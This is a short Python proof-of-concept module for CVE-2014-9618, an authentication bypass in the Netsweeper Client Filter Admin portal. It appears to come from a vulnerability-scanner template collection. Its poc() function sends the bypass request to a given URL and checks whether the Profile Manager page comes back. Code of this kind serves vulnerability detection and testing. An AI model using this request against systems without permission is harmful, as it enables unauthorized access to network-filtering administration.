import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Netsweeper 4.0.8 - Authentication Bypass (New Profile Creation)''',
        "description": '''The Client Filter Admin portal in Netsweeper before 3.1.10, 4.0.x before 4.0.9, and 4.1.x before 4.1.2 allows remote attackers to bypass authentication and subsequently create arbitrary profiles via a showdeny action to the default URL.''',
        "severity": "critical",
        "references": [
            "https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz", 
            "https://nvd.nist.gov/vuln/detail/CVE-2014-9618"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "9.8",
            "cve-id": "CVE-2014-9618",
            "cwe-id": "CWE-287"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2014", "netsweeper", "auth-bypass"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/webadmin/clientlogin/?srid=&action=showdeny&url='

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and 'name=formtag action="../clientlogin/?srid=&action=showdeny&url="' in resp.text and 'placeholder="Profile Manager">' in resp.text and '<title>Netsweeper WebAdmin</title>' in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url